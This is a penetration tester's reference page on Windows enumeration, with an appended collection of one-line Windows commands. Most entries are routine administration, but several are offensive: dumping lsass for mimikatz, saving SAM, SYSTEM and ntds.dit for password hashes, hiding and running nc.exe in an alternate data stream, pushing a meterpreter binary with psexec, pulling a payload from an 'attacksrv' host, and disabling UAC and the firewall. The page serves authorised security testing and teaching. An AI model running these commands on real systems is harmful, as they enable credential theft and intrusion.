# Enumeration

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

{% hint style="info" %}
Be aware sometimes these commands require elevated privileges to be run, or may be blocked by GPO.

Most commands the run in cmd.exe will also run in PowerShell! This gives many more options and flexibility at times.
{% endhint %}

[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) = My favorite Windows enumeration script, automates most common enumeration methods

## User Enumeration

### Get current user information:

{% tabs %}
{% tab title="PowerShell" %}
`[Security.Principal.WindowsIdentity]::GetCurrent()` Not very good output by default, need to manipulate the object a bit to get the desired information

TODO: add more...

better...still not the same as `whoami /all`

```text
$tableLayout = @{Expression={((New-Object System.Security.Principal.SecurityIdentifier($_.Value)).Translate([System.Security.Principal.NTAccount])).Value};Label=”Group Name”},
@{Expression={$_.Value};Label=”Group SID”},
@{Expression={$_.Type};Label=”Group Type”}

([Security.Principal.WindowsIdentity]::GetCurrent()).Claims | Format-Table $tableLayout -AutoSize
```
{% endtab %}

{% tab title="cmd.exe" %}
`whoami /all` Includes: Username, SID, Groups \(including their descriptions!\), and user privileges. 
{% endtab %}
{% endtabs %}

### Get list of users

{% tabs %}
{% tab title="PowerShell" %}
`Get-WmiObject -class Win32_UserAccount` \#if run on a domain connected machine dumps all accounts on the whole domain!
{% endtab %}

{% tab title="cmd.exe" %}
### Local machine Users & Groups Enumeration

```text
net user %username% #Me 
net users #All local users 
net localgroup #Groups 
net localgroup Administrators #Who is inside Administrators group 
```

### Active Directory Users & Groups Enumeration

```text
net user /domain
net group /domain
```
{% endtab %}
{% endtabs %}

#### Using WMI Query Language \(WQL\)

WQL is an entire subject on its own.  If you want to know the full extent of the capabilities of this powerful query language, type `Get-Help WQL` in a PowerShell prompt.  Below are a few examples of queries to pull lists of users from both local machines and from the domain.

```text
The following WQL query returns only local user accounts.

    $q = "Select * from Win32_UserAccount where LocalAccount = True"

    Get-CimInstance -Query $q

To find domain accounts, use a value of False, as shown in the following
example.

    $q = "Select * from Win32_UserAccount where LocalAccount = False"
    
    Get-CimInstance -Query $q
```

{% hint style="info" %}
WQL uses the backslash \(`\`\) as its escape character. This is different from Windows PowerShell, which uses the backtick character \(`````\).
{% endhint %}

### LAPS

LAPS allows you to manage the local Administrator password \(which is randomized, unique, and changed regularly\) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES. `reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled` When using LAPS, 2 new attributes appear in the computer objects of the domain: ms-msc-AdmPwd and ms-mcs-AdmPwdExpirationTime. These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes...

## OS Information

### Get OS Version information

{% tabs %}
{% tab title="PowerShell" %}
```text
[System.Environment]::OSVersion
```
{% endtab %}

{% tab title="cmd.exe" %}
```text
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
{% endtab %}
{% endtabs %}

### Get basic Windows information

{% tabs %}
{% tab title="PowerShell" %}
`Get-ComputerInfo`

Gives a ton of information about the current hardware and Windows configuration
{% endtab %}

{% tab title="cmd.exe" %}
`systeminfo`

Gives basic hardware information, Also lists the hotfixes that have been installed.  
{% endtab %}
{% endtabs %}

### Get installed patches

{% tabs %}
{% tab title="PowerShell" %}
```text
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} Get-Hotfix -description "Security update" #List only "Security Updates"
```

\#List only "Security Updates"
{% endtab %}

{% tab title="cmd.exe" %}
`wmic qfe get Caption,Description,HotFixID,InstalledOn`
{% endtab %}
{% endtabs %}

### Drivers

#### Get a list of installed drivers

{% tabs %}
{% tab title="PowerShell" %}
`Get-WindowsDriver -Online -All -Online` Specifies that the action is to be taken on the operating system that is currently running on the local computer.
{% endtab %}

{% tab title="cmd.exe" %}
`driverquery`
{% endtab %}
{% endtabs %}

#### Default log path

`%WINDIR%\Logs\Dism\dism.log`

#### Make back up of all installed drivers

`Export-WindowsDriver -Online -Destination "C:\Backup\Path\"`

### List Environment Variables

{% tabs %}
{% tab title="PowerShell" %}
Show all current environment variables: `Get-ChildItem Env:`

Also aliased to: `dir env:` or `ls env:` or `gci env:`
{% endtab %}

{% tab title="cmd.exe" %}
Show all current environment variables: `set` 
{% endtab %}
{% endtabs %}

### Check Audit \(logging\) Settings

These settings show what is being logged, this can be useful information for evasion and persistence `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit`

#### Windows Event Forwarding

Check where the logs are sent:`reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager`

### AV

Check if there is any antivirus intalled: `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get DisplayName | fl`

### Clipboard

Get the contents of the clipboard `Get-Clipboard`

## Software, Services, and Processes

### Software

#### List the installed software

{% tabs %}
{% tab title="PowerShell" %}
`Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)'` 

`Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE`
{% endtab %}

{% tab title="cmd.exe" %}
`dir /a "C:\Program Files"` 

`dir /a "C:\Program Files (x86)"` 

`reg query HKEY_LOCAL_MACHINE\SOFTWARE`
{% endtab %}
{% endtabs %}

### Services

Get a list of services: 

`net start` 

`wmic service list brief` 

`sc query` 

Get-Service

`Get-Process`

#### Get detailed information for a specific service

`sc qc <service_name>` To use this command in PowerShell you need to specify `sc.exe` instead of `sc`. In PowerShell `sc` is an alias for `Set-Content` and will not give the expected output.

`Get-Service`

#### Enable a disabled service

If you are having this error \(for example with SSDPSRV\):

> System error 1058 has occurred. The service cannot be started, either because it is disabled or because it has no enabled devices associated with it. You can enable it using:
>
> ```text
> sc config SSDPSRV start= demand
> sc config SSDPSRV obj= ".\LocalSystem" password= ""
> ```
>
> Note: In Windows XP SP1, the service upnphost depends on SSDPSRV to work

#### Enable a disabled service

If you are having this error \(for example with SSDPSRV\):

> System error 1058 has occurred. The service cannot be started, either because it is disabled or because it has no enabled devices associated with it. You can enable it using:
>
> ```text
> sc config SSDPSRV start= demand
> sc config SSDPSRV obj= ".\LocalSystem" password= ""
> ```
>
> Note: In Windows XP SP1, the service upnphost depends on SSDPSRV to work

### Get running processes

{% tabs %}
{% tab title="PowerShell" %}
`Get-Process`

With usernames of process owner `Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize`

Without usernames `Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id`
{% endtab %}

{% tab title="cmd.exe" %}
List all the service information for each process with `tasklist /svc`. Valid when the `/fo <format>` parameter is set to table \(default format\). Can be run remotely with `/s <name or IP address>` and credentialed with `/u <username>` and `/p <password>`. `/v` = verbose
{% endtab %}
{% endtabs %}

#### Check permissions of the process binaries

```text
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
    for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
        icacls "%%z" 
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
    )
)
```

#### Check permissions of the folders of the process binaries \(useful for dll injection\)

```text
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
    icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
todos %username%" && echo.
)
```

### Get current network connections

TODO: Find PowerShell way to do this

`netstat -ano`

[https://github.com/carlospolop/hacktricks/blob/master/windows/basic-cmd-for-pentesters.md\#network](https://github.com/carlospolop/hacktricks/blob/master/windows/basic-cmd-for-pentesters.md#network) \(\*check for more network enumeration info here\)

### AutoRuns

Check which files are executed when the computer is started. Components that are executed when a user logins can be exploited to execute malicious code when the administrator logins. \(cmd.exe\)

{% tabs %}
{% tab title="PowerShell" %}


```text
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
{% endtab %}

{% tab title="cmd.exe" %}


```text
wmic startup get caption,command 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul & ^
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul & ^
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
```
{% endtab %}
{% endtabs %}

#### SysInternals AutoRuns

For a comprehensive list of auto-executed files you can use AutoRuns from SysInternals [https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns): `autorunsc.exe -m -nobanner -a * -ct /accepteula`

## [madhuakula](https://github.com/madhuakula)/[**wincmdfu**](https://github.com/madhuakula/wincmdfu)

* TODO: Everything below from the above site...in the process of verification, cleanup, and assimilation.

## Windows CLI gems. Tweets of [@wincmdfu](https://www.twitter.com/wincmdfu)

Windows one line commands that make life easier, shortcuts and command line fu.

#### Get entries from IPv4 neighbor cache

```text
C:\>netsh interface ipv4 show neighbors
```

#### Get available wireless networks via cmd and netsh

```text
C:\>netsh wlan show networks mode=b
```

#### Quick list IP addresses only

Save the following in `ip.bat` in `%PATH%`

```text
C:\>ipconfig | find /I "pv"
```

Call `ip` from CLI

#### List ALL services AND their binaries

```text
for /F "tokens=2* delims= " %i in ('sc query ^| find /I "ce_name"') do @sc qc %i %j
```

#### Export SAM from the Windows Registry to a file

```text
C:\>reg save HKLM\SAM "%temp%\SAM.reg"
```

#### Enable remote desktop using reg

```text
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

#### Enable the boot log to see list of drivers loaded during startup

```text
bcdedit /set bootlog yes
```

Read via `%windir%\ntbtlog.txt`

#### Powershell cmdlet to create System Restore Point

```text
PS C:\>Checkpoint-Computer -description "Restore point!"
```

#### Check the current account for seDebugPrivilege

```text
C:\> whoami /priv | findstr "Debug"
```

For all privs:

```text
C:\> whoami /priv
```

#### Enable/disable system users via command line

```text
C:\>net user test /active:yes (no)
```

Get full help on the net user command:

```text
C:\>net help user
```

#### View process that is consuming the most memory using powershell

```text
PS C:\> (Get-Process | Sort-Object -Descending WS)[0]
```

#### Create an Alternate Data Stream from a file on an NTFS partition

```text
C:\>type data.txt > C:\windows\explorer.exe:newads.txt
```

#### Export running processes in CSV format

```text
C:\> tasklist /FO CSV > tasks.txt
```

#### Lock Windows desktop using command line

```text
C:\> rundll32 user32.dll,LockWorkStation
```

#### Start explorer with a file or folder selected/highlighted

```text
C:\> explorer /select,C:\MyData\sample.docx
```

#### Dump VirtualBox image containing RAM and ELF headers

```text
C:\>vboxmanage debugvm "WinXPLab1" dumpguestcore --filename winxplab1.elf
```

#### Set Time Zone of the system clock

```text
C:\> tzutil /s "Eastern Standard Time"
```

List available Time zones:

```text
C:\> tzutil /l
```

#### Make folder inside a guest from the host

**VirtualBox**

```text
C:\> vboxmanage guestcontrol "WinXP" md "C:\\test" --username "user" --password "pass"
```

#### Force copy meterpreter binary to remote machines & run as system

```text
C:\> psexec @$ips.txt -s -u adminuser -p pass -f -c \exploits\mp.exe
```

#### Create n/w share called `Apps`, with read access & limit to 10 conns

```text
C:\> net share Apps=C:\Apps /G:everyone,READ /US:10
```

#### List all the drives under My Computer using fsutil

```text
C:\> fsutil.exe fsinfo drives
```

#### Troubleshoot n/w packet drops with router statistics using pathping

```text
C:\> pathping -n www.google.com
```

#### List unsigned dlls for a specific process.

**For system wide list, remove the process name**

```text
C:\> listdlls -u explorer.exe
```

#### Obtain a list of Windows XP computers on the domain using PS

**Server2008**

```text
PS C:\> Get-ADComputer -filter {OperatingSystem -like "*XP*"}
```

#### Open the System Properties window, with the `Advanced` tab selected

**Change the number for different tabs**

```text
C:\> control sysdm.cpl,,3
```

#### Using the `dir` command to find Alternate Data Streams

```text
C:\> dir /R | find ":$D"
```

Using streams `sysinternals` \(shows path\):

```text
C:\> streams -s .
```

#### Use `procdump` to obtain the `lsass` process memory.

**Use `mimikatz` `minidump` to get passwords**

```text
C:\> procdump -accepteula -ma lsass.exe mini.dmp
```

#### Run `mimikatz` in `minidump` mode & use `mini.dmp` from `procdump`

```text
mimikatz # sekurlsa::minidump mini.dmp
mimikatz # sekurlsa::logonPasswords
```

#### Get list of startup programs using wmic

```text
C:\> wmic startup list full
```

#### Add a binary to an Alternate Data Stream

```text
C:\> type c:\tools\nc.exe > c:\nice.png:nc.exe
```

Execute it \(XP/2K3\):

```text
C:\> start c:\nice.png:nc.exe
```

#### Execute a binary Alternate Data Stream Win 7/2008 using wmic

```text
C:\> wmic process call create C:\nice.png:nc.exe
```

#### Show config & state info for Network Access Protection enabled client

[https://technet.microsoft.com/en-us/library/cc730902\(v=ws.10\).aspx](https://technet.microsoft.com/en-us/library/cc730902%28v=ws.10%29.aspx)

```text
C:\> netsh nap client show configuration
```

#### Get computer system information, including domain name and memory, using wmic

```text
C:\> wmic computersystem list /format:csv
```

#### Use the Package Manager in Windows to install the Telnet client on Windows Vista & higher

```text
C:\> pkgmgr /iu:"TelnetClient"
```

#### Secure delete a file/folder in Windows

**Sysinternals**

```text
C:\> sdelete -p 10 a.txt
```

To recursively delete folders:

```text
C:\> sdelete -10 -r C:\data\
```

#### Show all startup entries while hiding Microsoft entries. CSV output

**It covers more locations than Windows inbuilt tools**

```text
C:\> autorunsc -m -c
```

#### Download files via commandline using PS

```text
PS C:\> ipmo BitsTransfer;Start-BitsTransfer -Source http://foo/nc.exe -Destination C:\Windows\Temp\
```

#### Fetch the last 10 entries from the Windows Security event log, in text format

```text
C:\> wevtutil qe Security /c:10 /f:Text
```

**def is XML**

#### Create a dll that runs calc on invoke

```text
msfpayload windows/exec cmd=calc.exe R | msfencode -t dll -o rcalc.dll

C:\> rundll32.exe rcalc.dll,1
```

#### Run a command as another user

**You will be prompted for password**

```text
C:\> runas /noprofile /user:domain\username "mmc wf.msc"
```

#### Get shutdown/reboot events from the last 1000 log entries using PS

```text
Get-EventLog -log system -n 1000 | Where {$_.eventid -eq '1074'} | fl -pr *
```

#### Create a new snapshot of the volume that has the AD database and log files

```text
C:\> ntdsutil sn "ac i ntds" create quit quit
```

#### Mount the snapshot

**Copy ntds.dit from snapshot & System hive from reg for pwd hashes**

```text
C:\> ntdsutil snapshot "list all" "mount 1" quit quit
```

#### Run a process on a remote system using wmic

```text
C:\> wmic /node:ip process call create "net user dum dum /add"
```

#### List the machines, with usernames, that were connected via RDP

```text
C:\> reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
```

#### List all process that are running on your system by remote users connected via RDP

```text
C:\> query process *
```

#### Reset the Windows TCP\IP stack

```text
netsh int ip reset c:\tcpresetlog.txt
```

#### List logged on users.

**Very useful during a pentest to look for domain admins**

```text
C:\> net session | find "\\"
```

#### Set a static IP on a remote box

```text
C:\> wmic /node:remotebox nicconfig where Index=1 call EnableStatic ("192.168.1.4"), ("255.255.255.0")
```

#### Bypass powershell execution policy restrictions

```text
PS C:\> powershell -ExecutionPolicy Bypass -Noninteractive -File .\lastboot.ps1
```

#### List running processes every second on a remote box

```text
C:\> wmic /node:target process list brief /every:1
```

**Remove `/node:target` for localhost**

#### Get a list of running processes and their command line arguments on a remote system

```text
C:\> wmic /node:target process get commandline, name
```

#### Remotely enable and start the Volume Shadow Copy Service

```text
C:\> sc \\target config vss start= auto
C:\> sc \\target start vss
```

#### Ping multiple IPs from `ips.txt` & see live hosts

```text
C:\>for /F %i in (ips.txt) do ping -n 1 %i | find "bytes="
```

#### Set global proxy in Windows to point to IE proxy

```text
C:\> netsh winhttp import proxy source=ie
```

#### Enumerate list of drivers with complete path information

```text
C:\> driverquery /FO list /v
```

#### View Group Policy Objects that have been applied to a system

**Very useful during pentests**

```text
C:\> gpresult /z /h outputfile.html
```

#### Reset the WMI repository to what it was when the OS was installed

**Very helpful if you have a corrupt repo**

```text
C:\> winmgmt /resetrepository
```

#### Create symbolic links in Windows Vista, 7 & higher

```text
C:\> mklink <link> <target>
C:\> mklink D:\newlink.txt E:\thisexists.txt
```

#### Enable the tftp client in Vista & higher

```text
C:\> ocsetup TFTP /quiet
```

Pull files to a `compromised server`:

```text
C:\> tftp -i attacksrv get bin.exe
```

#### Obtain list of firewall rules on a local system

```text
C:\> netsh advfi fi sh rule name=all
```

**Can be combined with wmic for remote systems**

#### Get name of current domain controller

```text
C:\> set log
C:\> nltest /dcname:DOMAIN
```

Get list of all DCs:

```text
C:\> nltest /dclist:DOMAIN
```

#### Look at content cached in kernel mode on IIS 7 and higher

```text
C:\> netsh http sh ca
```

**Useful when investigating the `MS15-034` HTTP.sys vuln**

#### Quick test to check `MS15_034`

```text
C:\> curl -v -H "Range: bytes=234234-28768768" "http://host/a.png" -o a.png
```

**HTTP 416 = Vulnerable**

**HTTP 20X = Not vulnerable**

#### Get a list of all open Named pipes via Powershell

```text
PS C:\> [http://System.IO.Directory ]::GetFiles("\\.\\pipe\\")
```

#### Possible `VENOM` detection on VirtualBox

```text
C:\> vboxmanage list -l vms > a.txt
```

**Search 'Storage' & 'Floppy'**

#### List RDP sessions on local or remote in list format

```text
PS C:\> qwinsta /server: | foreach {($_.trim() -replace "\s+",",")} | ConvertFrom-Csv
```

#### Get a list of service packs & hotfixes using wmic for remote systems listed in file

```text
C:\> wmic /node:@file /output:out.txt qfe list full
```

#### Export wireless connection profiles

```text
C:\> netsh wlan export profile
```

**`key=clear` allows plain text passwords**

#### Unzip using PowerShell

```text
PS C:\> Add-Type -A System.IO.Compression.FileSystem;[IO.Compression.ZipFile]::ExtractToDirectory(src,dst)
```

#### Open the Network & Sharing center

```text
control.exe /name Microsoft.NetworkandSharingCenter
```

**Create a shortcut of this as `ns` in `PATH` for ease**

#### Remotely stop/start ftp on several systems

```text
C:\> wmic /node:@ips.txt /user:u /password:p process call create "net <start> msftpsvc"
```

#### To quickly find large files using cmd

```text
C:\> forfiles /s /c "cmd /c if @fsize gtr 100000 echo @path @fsize bytes"
```

**Run from the dir you want**

#### Print RDP connections

```text
for /f "delims=" %i in ('reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"') do reg query "%i"
```

#### List scheduled tasks & binaries

```text
C:\> schtasks /query /fo LIST /v
```

**Weak permissions can be exploited for `localprivilege escalation`**

#### Display the "Stored User names and Passwords" window

```text
C:\> rundll32 keymgr.dll,KRShowKeyMgr
```

#### List namespaces & classes in WMI via PowerShell

```text
PS C:\> gwmi -n root -cl __Namespace | Select name

PS C:\> gwmi -n root\cimv2 -li
```

#### Convert Between VDI, VMDK, VHD, RAW disk images using VirtualBox

```text
C:\> vboxmanage clonehd myvdi.vdi myvmdk.vmdk --format VMDK
```

#### Change file extensions recursively

**csv to xls example**

```text
C:\Projects> forfiles /S /M *.csv /C "cmd /c ren @file @fname.xls"
```

#### List IPs of running VirtualBox machines

```text
for /F %i in ('VBoxManage list runningvms') do VBoxManage guestproperty enumerate %i | find "IP"
```

#### Windows Privilege Escalation Slideshow

[![Windows Privilege Escalation](https://github.com/madhuakula/wincmdfu/raw/master/images/windows-privilege-esclation.png)](http://www.slideshare.net/riyazwalikar/windows-privilege-escalation)

#### Enumerate packages with their OEM .inf filenames

```text
C:\> pnputil -e
```

#### Install a driver package using .inf file

```text
C:\> pnputil -i -a path_to_inf
```

#### Malware Hunting with Mark Russinovich and the Sysinternals

[![Malware Hunting with Mark Russinovich and the Sysinternals Tools](https://camo.githubusercontent.com/6b3e069a3767ac14b74715d37bd3eddbdd4d9dcc/687474703a2f2f696d672e796f75747562652e636f6d2f76692f383076665441394c72424d2f302e6a7067)](https://www.youtube.com/watch?v=80vfTA9LrBM)

#### Windows Nano Server APIs

[https://msdn.microsoft.com/en-us/library/mt588480\(v=vs.85\).aspx](https://msdn.microsoft.com/en-us/library/mt588480%28v=vs.85%29.aspx)

### Start a Wi-Fi hotspot using cmd.exe

Open cmd.exe in admin mode

```text
netsh wlan show drivers

#if Hosted Network supported: Yes
netsh wlan set hostednetwork mode=allow ssid=$ESSID key=$password
netsh wlan start hostednetwork

#to stop
netsh wlan stop hostednetwork

#to check the status of the WiFi hotspot
netsh wlan show hostednetwork
```

#### Disable UAC via cmdline

```text
C:\> reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v EnableLUA /t REG_DWORD /d 0 /f
```

#### Turn off Windows firewall for all profiles

Useful if you have a bind shell

```text
C:\> netsh advfirewall set allprofiles state off
```

#### List Missing Updates

```text
PS C:\> (New-Object -c Microsoft.Update.Session).CreateUpdateSearcher().Search("IsInstalled=0").Updates|Select Title
```

#### Export SAM and SYSTEM Dump password hashes offline

```text
C:\>reg save HKLM\SAM SAM
C:\>reg save HKLM\SYSTEM SYSTEM
```

#### Convert Binary to base64 string to transfer across restricted RDP

```text
PS C:\> [Convert]::ToBase64String((gc -Pa "a.exe" -En By))
```

#### Convert Base64 string to Binary

```text
PS C:\> sc -Path "a.exe" -Val ([Convert]::FromBase64String((gc -Pa "b64.txt" ))) -En By
```

#### List services running as SYSTEM and possibly weak file permissions

```text
wmic service where StartName="LocalSystem"|findstr /IV ":\WIN :\PROG"
```

#### Check Bitlocker status on a remote box

```text
manage-bde -status -cn <box>
```

Use `wmic /node:@ips.txt` & `process` alias for multiple.

#### Export failed logon attempts

```text
PS C:\> Get-EventLog -Log Security | ?{$_.EntryType -eq 'FailureAudit'} | epcsv log.csv
```

#### Alternate Data Streams and PS

* List all ADS for all files in current dir

```text
PS C:\> gi * -s *
```

* Read ADS

```text
PS C:\> gc <file> -s <ADSName>
```

* Create ADS using text input

```text
PS C:\> sc <file> -s <ADSName>
```

* Delete ADS

```text
PS C:\> ri <file> -s <ADSName>
```

#### Run the Windows Assessment tool for cpu and ram and disk

```text
C:\> winsat cpuformal -v
C:\> winsat memformal -v
C:\> winsat diskformal -v
```

#### Port forward \(proxy\) traffic to remote host and port

```text
C:\> netsh int p add v4tov4 <LPORT> <RHOST> [RPORT] [LHOST]
```

#### Enable/Disable NetBIOS over TCP/IP

```text
Step 1. Get Index of Network Adapter:
C:\> wmic nicconfig get caption,index

Step 2. Use the index 
C:\> wmic nicconfig where index=1 call SetTcpipNetbios 1

0-Def
1-En
2-Dis
```

#### Compact multiple VDI files across folders

```text
C:\> for /F %i in ('dir /b /s *.vdi ^| find ".vdi"') do vboxmanage modifyhd --compact %i
```

#### Full scan using WinDefender

```text
C:\>"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -scan -scantype 2

Use #wmic /node:@ips process for multiple.
```

#### Generate 32 char random password

```text
PS C:\> ([char[]](38..126)|sort{Get-Random})[0..32] -join ''
```

#### 

## References

* [https://docs.microsoft.com/en-us/sysinternals/](https://docs.microsoft.com/en-us/sysinternals/)
* [https://docs.microsoft.com/en-us/powershell/](https://docs.microsoft.com/en-us/powershell/)
* [https://github.com/madhuakula/wincmdfu](https://github.com/madhuakula/wincmdfu)

